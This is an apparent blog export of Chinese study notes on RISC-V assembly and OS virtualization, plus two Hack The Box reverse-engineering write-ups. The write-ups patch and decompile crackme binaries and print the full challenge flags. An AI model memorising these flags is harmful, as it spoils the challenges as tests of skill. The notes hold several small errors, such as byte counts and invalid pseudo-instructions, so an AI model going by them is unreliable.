和 RV64I）不包含 mul 指令，乘法运算通常需要 M 扩展（RV32M/RV64M）。如果只允许使用 RV32I/RV64I 指令，则必须通过移位和加法手动实现乘法。 在硬件实现上，移位操作比乘法更快，因为移位仅涉及逻辑电路，而乘法通常需要额外的计算资源。 例子： 假设 那么 123mul s3, s1, s2mulh s4, s1, s2# {s4,s3} = s1 * s2 便会得到 除法以及余数： 逻辑运算 Logische Operation和： a = b AND c 1and a,b,c 或： 1or a,b,c 异或： 1xor a,b,c 移位（Shifts）： 移位操作分为2种： 1. 逻辑移位 logischer Shift ，用 &gt;&gt;, &lt;&lt;表示 用 0 填充空出的高位，无论原数是正数还是负数(Null Bits nachgeführt)，适用于 无符号数（unsigned numbers） 计算。 例子1： 假设 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25（补码表示） 那么经过 1srl t0, t0, 4 会得到 1t0 = 0000 1111 1111 1111 1111 1111 1111 1110 = 268435454（正数） 例子2： 假设 1t0 = 0000 0000 0000 0000 0000 0000 0001 1001 # 25（十进制） 那么经过 1sll t0, t0, 4 会得到 1t0 = 0000 0000 0000 0000 0000 0001 1001 0000 = 400（正数） （） 2. 算术移位 arithmetischen Shift，用 &gt;&gt;&gt;, &lt;&lt;&lt; 表示 会保持符号位（MSB）不变 (erhält Vorzeichen, 0 oder 1 nachgeführt) 如果是正数（MSB = 0），则用 0 填充高位。 如果是负数（MSB = 1），则用 1 填充高位。 适用于 有符号数（signed numbers） 计算，保持符号正确。 例子1： 假设 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25（补码表示） 那么经过 1sra t0, t0, 4 会得到 1t0 = 1111 1111 1111 1111 1111 1111 1111 1110 = -2 (负数) 左移本质上就是乘法。无论有符号数还是无符号数，左移的行为都是相同的，所以 RISC-V 没有 sla指令。 这里的 uimm 会被限制在 5-bit 的无符号整数。 数据传输（Datentransfer）读取（Lesen vom Speicher）： ld (load word) Format： 1ld destination, offset(base) 例子： 1ld a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) 写入（Schreiben in den Speicher）： sd (store word) Format： 1sd source, offset(base) 例子： 1ld a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) 跳转 Sprung无条件跳转： 12j immjr reg, imm 第一个会跳转到PC = PC + imm 第一个会跳转到PC = reg + imm 有条件跳转： 格式： 1bxx r1,r2,imm bxx的可选选项： branch if equal (beq)： branch if not equal (bne)： branch if less than (blt)： branch if greater than or equal (bge)： 例子1（if）： 123if (i == j){ f = g + h;}f = f – i; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123456# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2L1: sub s0, s0, s3 例子2（if, else）： 1234if (i == j){ f = g + h;}else{ f = f - i;} 跟上面这段c代码等价的RISC-V Assembler（汇编）： 12345678# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2 j doneL1: sub s0, s0, s3done: 例子2（while 循环）： 12345678// Berechne x, so dass// 2^x = 128int pow = 1;int x = 0;while (pow != 128) {pow = pow * 2;x = x + 1;} 跟上面这段c代码等价的RISC-V Assembler（汇编）： 12345678910# s0 = pow, s1 = x addi s0, zero, 1 add s1, zero, zero addi t0, zero, 128while: beq s0, t0, done slli s0, s0, 1 addi s1, s1, 1 j whiledone: 子程序调用 UnterprogrammeBegriffe： Caller（调用者）：调用函数的代码（如 main()）。 Callee（被调用者）：被调用的函数（如 simple()）。 12jal reg, offset #调用jr ra #返回 例子： 12345678int main() { simple(); a = b + c;}void simple() {return;} 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123450x00000300 main: jal simple # call0x00000304 add s0, s1, s2... ...0x0000051c simple: jr ra # return 其他的伪命令： 1mv ra, rb 跟 12add ra,rb,x0addi ra,rb,x0 等价。 递归（Rekursion）普通递归例子1：阶乘 1234int factorial(int n) { if (n == 0) return 1; return n * factorial(n - 1); // （递归调用后还有乘法,所以是非尾递归）} 对应的RISC-V（n=4的情况示例）： 1234567891011121314151617181920212223 _start:0x200 addi a0, zero, 4 # a0 = 4，计算 4 的阶乘（作为输入参数）0x204 jal ra, magic # 跳转调用 magic 函数（递归实现阶乘），返回地址存入 ra0x208 ebreak # 程序断点（模拟器中用于停止执行） magic:0x20c beq a0, zero, break # 如果 a0 == 0，跳转到 break（0! = 1）0x210 addi sp, sp, -8 # 分配栈空间：只保存 ra 和 a0，所以是2*4=8Bits0x214 sw ra, 0(sp) # 保存返回地址 ra 到栈顶0x218 sw a0, 4(sp) # 保存当前参数 a0（n）0x21c addi a0, a0, -1 # a0 = a0 - 1，准备递归调用 magic(n-1)0x220 jal ra, magic # 递归调用 magic(n-1)，返回值仍存在 a0 中0x224 lw t0, 4(sp) # 从栈中恢复原来的 a0（也就是 n）0x228 mul a0, a0, t0 # a0 = a0 * n（也就是 n! = n * (n-1)!）0x22c lw ra, 0(sp) # 恢复之前保存的返回地址0x230 addi sp, sp, 8 # 回收栈空间0x234 jalr zero, 0(ra) # 返回调用者（函数返回） break:0x238 addi a0, zero, 1 # a0 = 1，返回 1（0! = 1）0x23c jalr zero, 0(ra) # 返回调用者 由于每次计算 factorial(n) 的值时需要先等 factorial(n-1)的计算结果先出来，所以等待期间需要将所有的 n 都给存在stack里，也就是说： 123456789101112factorial(4) → 需要等factorial(3) 的结果 → 需要等 factorial(2) 的结果 → 需要等 factorial(1) 的结果 → 需要等 factorial(0) 的结果 → 返回 1然后开始回溯计算：factorial(1): 1 * 1 = 1factorial(2): 2 * 1 = 2factorial(3): 3 * 2 = 6factorial(4): 4 * 6 = 24 而栈结构如下： 12345678910111213+--------------------+| 0x4 || 0x208 |+--------------------+| 0x3 || 0x224 |+--------------------+| 0x2 || 0x224 |+--------------------+| 0x1 || 0x224 |+--------------------+ 返回的时候则是这样：当a0=0的时候触发0x20c的beq，跳转到break，break执行完了会跳转到当前的ra（也就是stack最底下一行的0x224），然后进行这部分操作： 123450x224 lw t0, 4(sp) # 从栈中恢复原来的 a0（也就是 n）0x228 mul a0, a0, t0 # a0 = a0 * n（也就是 n! = n * (n-1)!）0x22c lw ra, 0(sp) # 恢复之前保存的返回地址0x230 addi sp, sp, 8 # 回收栈空间0x234 jalr zero, 0(ra) # 返回调用者（函数返回） 计算a0 = 1*1然后继续跳转到stack倒数第三行的0x224，重复下去知道跳转到0x208，触发断点。 例子2：最大公约数 12345678unsigned ggT(unsigned a, unsigned b) { if (a == b) return a; else if (a &lt; b) return ggT(a, b - a); else return ggT(a - b, b);} 对应的RISC-V： 1234567891011121314151617181920ggT: beq a0, a1, finished # 如果 a0 == a1，则跳转到 finished（返回结果） bltu a0, a1, lt # 如果 a0 &lt; a1，则跳转到 lt 标签（交换顺序） sub a0, a0, a1 # 否则 a0 &gt; a1，执行 a0 = a0 - a1 j cont # 跳转到 cont，准备递归调用lt: sub a1, a1, a0 # 执行 b = b - a （即 a1 = a1 - a0）cont: addi sp, sp, -16 # 为返回地址创建栈空间（递归调用前保存返回地址） sw ra, 0(sp) # 保存返回地址 jal ra, ggT # 递归调用 ggT（jump and link） lw ra, 0(sp) # 恢复返回地址 addi sp, sp, 16 # 回收栈空间 jalr zero, 0(ra) # 返回（跳转回上层调用） finished: jalr zero, 0(ra) # 返回当前的 a0 作为结果 总结一下： 每个Recursive的函数递归部分会分成2部分： 从当前n的情况跳转到n-1，保存当前n的值以及返回地址（即当前跳转命令的下一行的地址） 读取返回地址并用当前已经计算出来的n-1的情况的值与n进行函数运算。 相当于递减完了之后还得递增回来。 注意，2个例子里分配的stack的大小是不一样的，这个主要是看ABI的具体要求，这里主要目的是示范而已。但不管大小如何，一定要保证分配的Stack大小和回收的大小是一致的。 尾递归（Tail Rekursiob）观察上面例子里stack存储的内容不难发现，如果递归的次数较高，则会很容易导致Stack Overflow。 为了解决这个问题，我们可以使用另一种递归方式：尾递归（Tail Rekursiob） 还是拿阶乘举例，我们将代码优化成这样： 1234int factorial(int n, int acc = 1) { if (n == 0) return acc; return factorial(n - 1, n * acc); // 尾调用} 对应的RISC-V： 123456789factorial: beqz a0, end_factorial mul a1, a0, a1 # acc = acc * n addi a0, a0, -1 # n = n-1 tail factorial # 尾调用（跳转，无需保存返回地址）end_factorial: mv a0, a1 # 返回结果 ret 这里的调用过程则会变成： 12345factorial(3, 1)→ 直接 tail call 到 factorial(2, 3)→ 再 tail call 到 factorial(1, 6)→ 再 tail call 到 factorial(0, 6)→ 结束：返回 acc = 6 栈结构如下： 12345678910+--------------------+| 当前调用（复用栈帧）|| n=3, acc=1 |→ tail call → 替换为：| n=2, acc=3 |→ tail call → 替换为：| n=1, acc=6 |→ tail call → 替换为：| n=0, acc=6 |→ return 6 不再需要存储所有中间的 n 的值。相当于是直接跳转而不是等待。 带有立即数（immediate）的命令立即数（Immediate/Konstante）：由指令本身携带，不需要从寄存器或内容中加载 aadi a = b + imm（一个立即数） 1addi a,b,&lt;imm&gt; 注意，RISC-V里是没有subi这种操作的，因为它可以被addi代替： subi a,b,x是等价于addi a,b,-x的（这里的x是一个立即数/常数）。 但sub不可以被add替代，是因为sub a,b,-c这个操作不合规（c是一个register，不存在-c这种操作）。 这里可以使用的立即数的大小会被限制在 （具体原因会在之后机器码的部分阐述） 生成32-Bit的常数： 需要用到 load upper immediate (lui) 和 addi lui 的作用是将一个常数加载到目标寄存器的高 20 位（也就是5Bytes），并将低 12 位（4Bytes）填充为 0。 而addi则负责将低 12 位（4Bytes）的数值加到目标寄存器中。 例子： C: 1int a = 0xFEDC8765; 对应的汇编： 123# s0 = alui s0, 0xFEDC8 # s0 = 0xFEDC8000addi s0, s0, 0x765 RISC-V 机器码 Machine Code/Instrunction将汇编语言翻译成机器码主要依靠下面这2张表： 首先，所有的操作会被分成6个大类： Register/register (R) Immediate (I) Upper immediate (U) Store (S) Branch (B) 条件跳转 Jump (J) 然后会通过funct3以及funct7确定具体操作。（funct7更多的是为了扩展的操作/功能。） rs1, rs2, rd存储的是寄存器的地址，而imm存储的则是立即数（immediate）的数值。其中rd是目标寄存器。 例子： 1addi a1, a2,1 假设a1（rd），a2（rs1）的地址为00010，01010， 因为addi指令的opcode和funct3为：0010011, 000 ，这行命令会翻译成以下的机器码： 123imm[11:0] | rs1 | funct3 | rd | opcode------------|-------|--------|-------|--------000000000001| 01010 | 000 | 00010 | 0010011 S,T,J 那部分内容将imm的值拆成好几部分是为了其他内容的位置可以对齐，比如说rs2的位置都是第20-24bit。 Branch和Jump都是跳转操作，所以会将imm（跳转地址）的第一位（符号位）imm[12]或者imm[20]放在开头，以确定是向后跳转还是向前。然后因为RISC-V的命令都是32位的，也就是4Byte，所以所有地址都是4的倍数，也就不需要imm[0]的信息了，因为imm[0]始终等于0。 例题1. Register s5 nullen 将寄存器s5的值设为0：123mov s5, 0#或者是li s5, 0 2. Wert in Register a1 nach s3 kopieren 将s3的值复制到s1里：1mv s3, a1 3. Dasunterste Bit von a0 nach t1 schreiben, restliche Bits sollen 0 sein 将 a0 的最低位写入 t1，其他位清零:1andi t1, a0, 1 1在二进制中只有最后一位是1，其他位置都是0，所以a0的其他位置与0进行and操作都会得到0，而最后一位与1进行and操作会保留原本内容。 4. Register s1 mit Einsen füllen 将寄存器 s1的值为全都是 1：1li s1, -1 因为-1 的二进制表示全 1 5. Unterstes Byte von t0 nach a0 schreiben, Rest unverändert 将 t0 的最低字节写入 a0，保持其余部分不变：12andi a0, a0, -256 # 清除 a0 的最低字节 (0xFFFFFF00)or a0, a0, t0 # 直接合并 t0 低字节 -256的二进制表示为 11111 1111 1111 1111 1111 1111 0000 0000 最后一个Byte的内容都是0，所以将它与a0进行and操作可以清除a0的最后一个Byte的内容，前面的保留。 然后将a0和t0直接进行or操作，会保留a0的前面部分，以及t0的最后一个Byte的内容。","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur, 计算机体系结构, 汇编语言, RISC-V","slug":"Rechnerarchitektur-计算机体系结构-汇编语言-RISC-V","permalink":"http://example.com/tags/Rechnerarchitektur-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-RISC-V/"}]},{"title":"1 Einführung und Datenrepräsentation","slug":"TUM笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation","date":"2025-03-18T12:12:02.000Z","updated":"2025-03-18T16:16:39.872Z","comments":true,"path":"2025/03/18/TUM笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","permalink":"http://example.com/2025/03/18/TUM%E7%AC%94%E8%AE%B0/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","excerpt":"计算机体系结构基础相关笔记","text":"Einführung in die Rechnerarchitektur (ERA)DatendarstellungenZahlensystemeDezimalsystem Binärsystem Hexadezimalsystem Gängige Wortlängen Negative Ganze Zahlen假如专门用一个Bit来表示正负号（比如说)，这样子做会带来一个问题：所以一般使用Zweierkomplement，即Invertierung (Einerkomplement) + 1。 例子： 这样做的好处就是加法会非常自然：","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur, 计算机体系结构","slug":"Rechnerarchitektur-计算机体系结构","permalink":"http://example.com/tags/Rechnerarchitektur-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}]},{"title":"HTB_rev Find The Easy Pass","slug":"Reverse Engineering/HTB-rev-Find-The-Easy-Pass","date":"2025-03-16T21:39:15.000Z","updated":"2025-03-16T22:15:14.133Z","comments":true,"path":"2025/03/16/Reverse Engineering/HTB-rev-Find-The-Easy-Pass/","permalink":"http://example.com/2025/03/16/Reverse%20Engineering/HTB-rev-Find-The-Easy-Pass/","excerpt":"","text":"这道题会给我们一个exe文件，打开是一个判断输入的密码是否正确的软件： 我们用IDA打开它，会发现并没有反编译出main()函数。所以我们随便输入一点内容试一下： 会返回Wrong Password!字样。接着我们尝试用IDA搜索这段内容，会发现： 点击第二个结果会跳转到： 注意到它的上方有着”Goob Job. Congratulation”的字样，我们猜测这是输入成功后返回的内容，所以我们点击它下方 XREF 的内容，查看这个变量在哪里被调用过，通过反汇编会得到以下内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243int __fastcall TForm1_Button1Click(int a1)&#123; int v2; // ecx int v3; // edx char v4; // zf unsigned int v6[2]; // [esp-Ch] [ebp-38h] BYREF int *v7; // [esp-4h] [ebp-30h] int v8; // [esp+4h] [ebp-28h] BYREF int v9; // [esp+8h] [ebp-24h] BYREF int v10; // [esp+Ch] [ebp-20h] BYREF int v11; // [esp+10h] [ebp-1Ch] BYREF int v12; // [esp+14h] [ebp-18h] BYREF int v13; // [esp+18h] [ebp-14h] BYREF int v14; // [esp+1Ch] [ebp-10h] BYREF int v15; // [esp+20h] [ebp-Ch] BYREF int v16; // [esp+24h] [ebp-8h] BYREF int v17; // [esp+28h] [ebp-4h] BYREF int savedregs; // [esp+2Ch] [ebp+0h] BYREF v7 = &amp;savedregs; v6[1] = (unsigned int)&amp;loc_454171; v6[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v6); System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]); System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]); System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]); System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]); System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]); System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); Controls::TControl::GetText(*(Controls::TControl **)(a1 + 760)); System::__linkproc__ LStrCmp(v8, v17); if ( v4 ) Dialogs::ShowMessage((Dialogs *)&amp;str_Good_Job__Congr[1], v3); else Dialogs::ShowMessage((Dialogs *)&amp;str_Wrong_Password_[1], v3); __writefsdword(0, v6[0]); v7 = (int *)&amp;loc_454178; System::__linkproc__ LStrClr(&amp;v8); return System::__linkproc__ LStrArrayClr(&amp;v9, 9);&#125; 这段代码的主要逻辑是将这些赋值变量 123456789System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]);System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]);System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]);System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]);System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]);System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); 拼接成一个新的字符串 v17 1System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); 然后比较输入的字符串与v17。所以我们只需要查看那些赋值字符串的具体值便可得到密码：fortran! 按照题目要求flag内容为：HTB{fortran!}。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"http://example.com/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"Reverse Engineering, HTB","slug":"Reverse-Engineering-HTB","permalink":"http://example.com/tags/Reverse-Engineering-HTB/"}]},{"title":"HTB_rev Behind the Scenes","slug":"Reverse Engineering/HTB-rev-Behind-the-Scenes","date":"2025-03-12T01:22:42.000Z","updated":"2025-03-16T21:39:33.062Z","comments":true,"path":"2025/03/12/Reverse Engineering/HTB-rev-Behind-the-Scenes/","permalink":"http://example.com/2025/03/12/Reverse%20Engineering/HTB-rev-Behind-the-Scenes/","excerpt":"","text":"用010 Editor （或者Hex Editor之类的都行）打开源文件，将里面所有的 0F 0B （即 ud2 ）改为 90 90 （90即NOP，是Machine Code中表示 无操作 (No Operation) 的命令），然后再用IDA打开文件即可看到完整的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __fastcall main(int argc, const char **argv, const char **envp){ struct sigaction s; // [rsp+10h] [rbp-A0h] BYREF unsigned __int64 v5; // [rsp+A8h] [rbp-8h] v5 = __readfsqword(0x28u); memset(&amp;s, 0, sizeof(s)); sigemptyset(&amp;s.sa_mask); s.sa_handler = (__sighandler_t)segill_sigaction; s.sa_flags = 4; sigaction(4, &amp;s, 0LL); if ( argc == 2 ) { if ( strlen(argv[1]) == 12 ) { if ( !strncmp(argv[1], \"Itz\", 3uLL) ) { if ( !strncmp(argv[1] + 3, \"_0n\", 3uLL) ) { if ( !strncmp(argv[1] + 6, \"Ly_\", 3uLL) ) { if ( !strncmp(argv[1] + 9, \"UD2\", 3uLL) ) printf(\"&gt; HTB{%s}\\n\", argv[1]); return 0; } else { return 0; } } else { return 0; } } else { return 0; } } else { return 0; } } else { puts(\"./challenge &lt;password&gt;\"); return 1; }} 所以flag为 1HTB{Itz_0nLy_UD2}","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"http://example.com/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"Reverse Engineering, HTB","slug":"Reverse-Engineering-HTB","permalink":"http://example.com/tags/Reverse-Engineering-HTB/"}]},{"title":"GBS 9 Virtualisierung 虚拟化","slug":"TUM笔记/GBS/GBS-9-Virtualisierung-虚拟化","date":"2025-03-11T17:17:37.000Z","updated":"2025-03-20T19:22:31.112Z","comments":true,"path":"2025/03/11/TUM笔记/GBS/GBS-9-Virtualisierung-虚拟化/","permalink":"http://example.com/2025/03/11/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-9-Virtualisierung-%E8%99%9A%E6%8B%9F%E5%8C%96/","excerpt":"操作系统基础相关笔记","text":"Einführung Abstraktionssichten: 复杂系统可以通过抽象层更好地描述。 Fokus auf relevante Funktionalitäten 抽象层通过接口（Interfaces）相互分离（durch Schnittstellen (Interfaces) voneinander getrennt）： 使得每一层可以独立开发和实现，并且高层系统只需要与接口交互，而不需要了解底层实现。 z.B. Systemcalls: Implementierung durch Interface verborgen ： 只需要直接用read(), write()这些命令，不需要关注&#x2F;知道这些调用在内核中的具体实现。 Interfaces können die Software Sicht auf die Hardware definieren ：软件可以通过接口来访问硬件，而无需直接操作硬件。 Interfaces Instruction Set Architecture (ISA): 指令集架构 Interface zwischen dem BS und Hardware 是操作系统与硬件之间的接口 besteht aud User- und System-ISA Application Binary Interface (ABI): 应用二进制接口 Interface zwischen Anwendungen und dem Betriebssystem 是应用程序与操作系统之间的接口 besteht aus dem System Call Interface und der User ISA Die Sicht auf das System hängt von der Software-Perspektive ab： 如果是开发操作系统的话，则需要考虑操作系统与硬件的交互接口（isa）； 而如果是开发普通软件的话，则更关注软件与操作系统的接口（abi），相当于通过操作系统来访问硬件。 Ein Hardware-System (physische Maschine) bietet eine Laufzeitumgebung für die darüberliegende Software： BS virtualisiert bereits: Prozesse, virtueller Speicher und Abstraktionen Eine Virtuelle Maschine implementiert eine virtuelle Laufzeitumgebung： Abbilden von virtuellen auf physische Ressourcen 虚拟运行环境的分类 System Virtual Machines（系统虚拟机） 虚拟化整个系统 Process Virtual Machines（进程虚拟机） 仅为单个进程提供虚拟环境 Anforderungen an Virtualisierung 对虚拟化的要求 Equivalences &#x2F; Fidelity：等效性 虚拟化应该让操作系统和应用程序无需特殊修改（或者最小程度的改动）便可以在虚拟机上运行。 Resource Control &#x2F; Safety (Isolation)： 隔离性 必须确保虚拟机（的资源）彼此不会影响；Hypervisor需要控制所有底层资源 Efficiency &#x2F; Performance：性能 大部分指令应该直接在硬件上执行 系统虚拟机 （System Virtual Machines）我们为什么需要系统虚拟机？ 模拟（Emulation） 使得操作系统可以在不同的 ISA上运行，并且在虚拟机中调试操作系统通常比在物理硬件（裸机）上更方便。 隔离（Isolation） 受损或遭到攻击的 Guest OS 无法影响其他虚拟机，也无法修改 Hypervisor 本身。 安全性（Sicherheit） Hypervisor 更容易保护（代码量较小、权限较高）。 资源利用（Ressourcennutzung） 物理硬件资源可以更好（更灵活）地分配和利用。 Hypervisor &#x2F; Virtual Machine Monitor (VMM) 虚拟机监控器Hypervisor负责给操作系统提供运行环境，通常会分为2类： Typ 1 Hypervisor &#x2F;Bare-Metal-Hypervisor （裸机式） 直接在物理硬件上运行容器，没有额外虚拟化层的存在。这种方式的主要优点在于性能的极致优化，因为没有虚拟化带来的开销。 比如 Xen, Hyper-V, VMware ESX。 Typ 2 Hypervisor （托管式） 依赖于宿主操作系统的服务（ Verwendet Dienste des Host-BS）。 比如 KVM, VirtualBox, VMware Workstation。 Hypervisor实现了一个虚拟的 ISA，同样分User- 和 System-ISA。 Hypervisor虚拟化整个物理机器，并且提供虚拟化硬件作为借口让Gast-BS可以在上面运行。可以使得Gast-BS以为&#x2F;产生错觉（Illusion）自己对硬件拥有完整的控制权。但实际上对于Hypervisor来说，Gast-BS就只是个软件而已。 这样做的好处就是一个虚拟机可以运行任意操作系统，并且可以同时运行多个相同或不同的操作系统。 Hypervisor 负责控制和虚拟化系统的硬件资源： CPU 虚拟化（CPU-Virtualisierung） 内存虚拟化（Speicher-Virtualisierung） I&#x2F;O 虚拟化（I&#x2F;O-Virtualisierung） 并需要确保Gast-BS不能访问未分配给它的资源。 CPU 虚拟化（CPU-Virtualisierung）CPU 的虚拟化方法一般是分以下3种： 半虚拟化（Paravirtualization）： 使用经过修改的操作系统 在虚拟机（VM）中运行，该 OS 知道自己处于虚拟化环境中。 设备驱动程序（Geräte Treiber）会通过 Hypercalls 与Hypervisor进行交互。 二进制翻译（Binary Translation）： 可以运行未经修改的操作系统，甚至可以在不同架构上运行（例如 x86 上模拟 ARM）。 Hypervisor会解释&#x2F;模拟Gast-BS的部分二进制代码，所以会导致性能开销（Performance-Overhead） 这种Hypervisor的实现非常复杂。 硬件辅助虚拟化（Hardware-assisted Virtualization） 可以运行未经修改的操作系统，可以实现高效的虚拟机（effizienten VMs），减少性能损失。所以是目前最主流的。 与普通操作系统中的内核空间（Kernel Space）与用户空间（User Space）不同（但相似）的是，我们这里会讨论的是高权限的 系统模式（System Mode） 和 用户模式（User Mode）。Hypervisor 会在系统模式（System Mode）运行，而Guest-BS则是会在用户模式（User Mode）运行。 某些在用户模式下执行的指令会被 Hypervisor 在系统模式下拦截，以确保Hypervisor 拥有对虚拟机的完全控制。 （套娃，User Mode里又有Virtual User Mode 和Virtual System Mode。） ISA中的指令可以分为以下3类： 特权指令（Privileged Instructions）： 只能在系统模式（System Mode）下执行。 如果在用户模式（User Mode）下执行，则会触发陷阱（Trap），由 Hypervisor 处理。 敏感指令（Sensitive Instructions）： 其中又分为 控制敏感指令（Control-Sensitive Instructions）：将修改系统配置（例如 修改页表（Page Tables）） 与**行为敏感指令（Behaviour-Sensitive Instructions）**：这些指令在不同模式下（用户模式 vs. 系统模式）的行为也是不同的。 无害指令（Innocuous Instructions）： 不属于前2类的则都属于这类。 虚拟化需要确保其中的敏感指令（Sensitive Instructions）必须是特权指令（Privileged Instructions）的子集。 反例可以参考x86架构中的POPF 指令（从栈加载标志寄存器 Flags）。 内存虚拟化（Speicher-Virtualisierung）在正常的非虚拟化情况下，操作系统（OS） 会直接管理物理内存并分配给不同的进程，利用前面学到的Seitentabelle(Page Table)。但在虚拟化的情况下，Hypervisor 需要作为最高管理者（übergeordnete Instanz）负责内存资源分配，确保Gast-BS不能随意访问物理内存且只能“看到”分配给它的部分。 下面介绍内存虚拟化的2中方法： 影子页表（Shadow Page Table, SPT） 硬件辅助的二级地址转换（Second Level Address Translation, SLAT） 影子页表（Shadow Page Table, SPT）在这个方法里一共存在三个内存抽象层： 物理内存 （Host-Physische Adressen, HPA） Hypervisor 对物理内存的抽象 即分配给Gast-BS的内存 （Gast-Physische Adressen）。这些内存对于Gast-BS来说是连续的，但是在实际的物理内存里不一定连续。 虚拟内存（ Virtueller Speicher） Guest OS 维护自己的页表（这些页表 不会 被 MMU（内存管理单元） 直接使用。），而Hypervisor维护影子页表（SPT）。为了保持页表的同步，Gast-BS只能以只读（Read-Only）方式访问它的页表，任何写入页表的尝试都会被 Hypervisor 拦截（Trap），让Hypervisor好更新Gast-BS的页表与SPT。 相当于影子页表是中间的那层页表。 SPT的问题也很显而易见：管理起来非常复杂而且开销很高（hoher Overhead）。 二级地址转换（Second Level Address Translation, SLAT）SLAT 由 CPU 提供硬件支持，将Gast-BS看到的 Gast 物理地址 (Gast-Physische Adressen) 映射到主机物理地址 (HPA)。Hypervisor 仅在 Guest OS 访问未映射的地址时才介入，减少性能开销。 例子： Intel Extended Page Tables (EPT), AMD Nested Page Tables (NPT) 虚拟机的内存管理跟进程管理的内存分配问题类似，我们也需要考虑该给每台虚拟机分配多少内存。 静态分配会导致不灵活，占用固定资源的问题。 动态分配的原理则是**过量分配（Overcommitment）**（假设并非所有 VMs 同时需要全部已分配的内存。）但这样会在回收已分配的内存时碰到问题，因为Hypervisor 无法知道哪些内存页是重要的，哪些可以释放。 为了解决这个问题我们可以使用 Ballooning (“balloon driver”)：Gast-BS内部的软件与Hypervisor进行通信：（没有内存压力的虚拟机）释放内存（“气球放气”）；申请内存（”给气球充气“）。 I&#x2F;O 虚拟化（I&#x2F;O-Virtualisierung）介绍几种I&#x2F;O 虚拟化的技术： 完整虚拟化&#x2F;仿真（Full Virtualization&#x2F;Emulation）Hypervisor管理所有 Guest VM 的I&#x2F;O请求，调度I&#x2F;O资源。 Hypervisor 通过软件多路复用（multiplext）或仿真（emuliert）I&#x2F;O 设备。 Hypervisor会拦截Guest VM的I&#x2F;O请求，并将其转发到物理 I&#x2F;O 设备。 优势： 高效 Gemultiplexte I&#x2F;O-Geräte sind effizient； 透明 Transparentes Geräte-Management。 问题： 实现起来太复杂； Hypervisor 需要为多种 I&#x2F;O 设备提供驱动程序。； 如果 I&#x2F;O 设备完全仿真（Emulation），会产生较高的性能开销（Overhead）。 半虚拟化（Paravirtualization）将 I&#x2F;O 设备驱动分为两部分 使用**拆分驱动架构（Split-Driver-Architektur）** 后端驱动（Backend-Treiber）：运行在 Hypervisor 或 I&#x2F;O 处理 VM 内，实际管理物理设备。 前端驱动（Frontend-Treiber）：运行在 Gast-BS 内，与后端驱动通信。 优势： 开销更低（Geringer Overhead）； 更容易实现； Guest OS 适配更灵活，可以通过 已有驱动支持新设备。 问题： Guest OS 需要额外修改或安装特定驱动。 设备域（Device Domains）一台VM充当所有I&#x2F;O设备的接口（在Xen中称为Domain 